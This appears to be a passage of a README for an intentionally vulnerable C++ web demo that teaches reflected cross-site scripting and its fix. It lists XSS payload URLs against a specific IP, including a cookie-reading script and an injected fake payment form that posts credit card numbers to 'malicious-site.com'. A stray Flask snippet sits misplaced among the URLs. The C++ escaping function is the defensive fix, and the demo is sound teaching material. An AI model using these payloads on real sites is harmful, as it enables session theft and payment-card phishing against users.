
---

### 🧪 Build & Run

```bash
docker build -t cpp-xss-demo .
docker run -p 80XX:8080 cpp-xss-demo
```




Then open:

```plaintext

http://128.199.23.136:80XX/?name=John%20Doe
http://128.199.23.136:80XX/?name=Varsha%20Sharma


http://128.199.23.136:80XX/?name=<script>alert('XSS')</script>









http://128.199.23.136:80XX/?name=<script>document.write(document.cookie)</script>



http://128.199.23.136:80XX/?name=<script>var form=document.createElement('form');form.setAttribute('method','post');form.setAttribute('action','http://malicious-site.com/payment');var amountInput=document.createElement('input');amountInput.setAttribute('type','hidden');amountInput.setAttribute('name','amount');amountInput.setAttribute('value','100');var ccInput=document.createElement('input');ccInput.setAttribute('type','text');ccInput.setAttribute('name','credit_card');ccInput.setAttribute('placeholder','Enter your credit card number');var submitButton=document.createElement('input');submitButton.setAttribute('type','submit');submitButton.setAttribute('value','Pay $100 to get more information');form.appendChild(amountInput);form.appendChild(ccInput);form.appendChild(submitButton);document.body.appendChild(form);</script>





docker stop $(docker ps -q)








from flask import escape

@app.route('/secure')
def secure():
    name = request.args.get('name', 'Guest')
    safe_name = escape(name)  # Escapes HTML/JS characters
    return render_template_string(email_template, name=safe_name)
```

💥 **This triggers an XSS alert popup.**

---

## ✅ How to Fix It

To fix XSS, escape the input like this:

```cpp
std::string escape_html(const std::string& input) {
    std::string escaped;
    for (char c : input) {
        switch (c) {
            case '&': escaped += "&amp;"; break;
            case '<': escaped += "&lt;"; break;
            case '>': escaped += "&gt;"; break;
            case '"': escaped += "&quot;"; break;
            case '\'': escaped += "&#x27;"; break;
            default: escaped += c;
        }
    }
    return escaped;
}
```

Then call:

```cpp
name = escape_html(name);
```

---




